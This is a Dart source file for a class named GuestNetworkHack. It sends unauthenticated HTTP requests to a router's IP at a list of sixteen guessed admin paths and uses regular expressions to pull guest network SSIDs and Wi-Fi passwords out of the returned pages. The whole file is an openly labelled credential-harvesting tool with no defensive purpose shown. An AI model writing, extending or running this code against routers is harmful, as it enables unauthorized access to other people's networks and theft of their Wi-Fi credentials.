import 'package:http/http.dart' as http;

class GuestNetworkResult {
  final bool success;
  final String? guestSSID;
  final String? guestPassword;
  
  GuestNetworkResult({
    required this.success,
    this.guestSSID,
    this.guestPassword,
  });
}

class GuestNetworkHack {
  
  final List<String> _guestPaths = [
    '/guest_network', '/guest_wifi', '/guest', '/wifi_guest',
    '/network/guest', '/wireless_guest', '/guest_settings',
    '/cgi-bin/guest', '/goform/guest', '/guest_wireless',
    '/wifi/guest', '/lan/guest', '/guest_network_settings',
    '/guest_ap', '/guest_wlan', '/guest_access',
  ];
  
  Future<GuestNetworkResult> hackGuestNetwork(String routerIp) async {
    for (final path in _guestPaths) {
      try {
        final response = await http.get(
          Uri.parse('http://$routerIp$path'),
        ).timeout(Duration(seconds: 3));
        
        if (response.statusCode == 200) {
          final guestSSID = _extractGuestSSID(response.body);
          final guestPassword = _extractGuestPassword(response.body);
          
          if (guestSSID != null || guestPassword != null) {
            return GuestNetworkResult(
              success: true,
              guestSSID: guestSSID,
              guestPassword: guestPassword,
            );
          }
        }
      } catch (_) {}
    }
    
    return GuestNetworkResult(success: false);
  }
  
  String? _extractGuestSSID(String html) {
    final patterns = [
      r'guest_ssid["\s]*[:=]["\s]*([^"<&]+)',
      r'guestssid["\s]*[:=]["\s]*([^"<&]+)',
      r'<input[^>]*name="guest_ssid"[^>]*value="([^"]+)"',
      r'SSID["\s]*[:=]["\s]*([^"<&]+)',
    ];
    
    for (final pattern in patterns) {
      final match = RegExp(pattern, caseSensitive: false).firstMatch(html);
      if (match != null) {
        final extracted = match.group(1)?.trim();
        if (extracted != null && extracted.isNotEmpty && extracted.length > 3) {
          return extracted;
        }
      }
    }
    return null;
  }
  
  String? _extractGuestPassword(String html) {
    final patterns = [
      r'guest_password["\s]*[:=]["\s]*([^"<&]+)',
      r'guestpass["\s]*[:=]["\s]*([^"<&]+)',
      r'<input[^>]*name="guest_password"[^>]*value="([^"]+)"',
      r'<input[^>]*name="guest_wpa_key"[^>]*value="([^"]+)"',
    ];
    
    for (final pattern in patterns) {
      final match = RegExp(pattern, caseSensitive: false).firstMatch(html);
      if (match != null) {
        final extracted = match.group(1)?.trim();
        if (extracted != null && extracted.isNotEmpty && extracted.length >= 8) {
          return extracted;
        }
      }
    }
    return null;
  }
}
